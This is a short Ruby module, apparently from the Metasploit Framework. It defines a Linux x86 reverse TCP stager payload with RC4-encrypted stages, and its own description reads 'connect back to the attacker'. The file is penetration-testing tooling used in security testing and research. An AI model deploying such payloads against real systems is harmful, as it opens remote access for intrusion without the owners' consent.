# -*- coding: binary -*-
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/linux/reverse_tcp_rc4'

module MetasploitModule

  CachedSize = 398

  include Msf::Payload::Stager
  include Msf::Payload::Linux::ReverseTcpRc4

  def self.handler_type_alias
    "reverse_tcp_rc4"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager (RC4 Stage Encryption, Metasm)',
      'Description'   => 'Connect back to the attacker',
      'Author'        => [ 'tkmru' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        => { 'RequiresMidstager' => true }))
  end
end
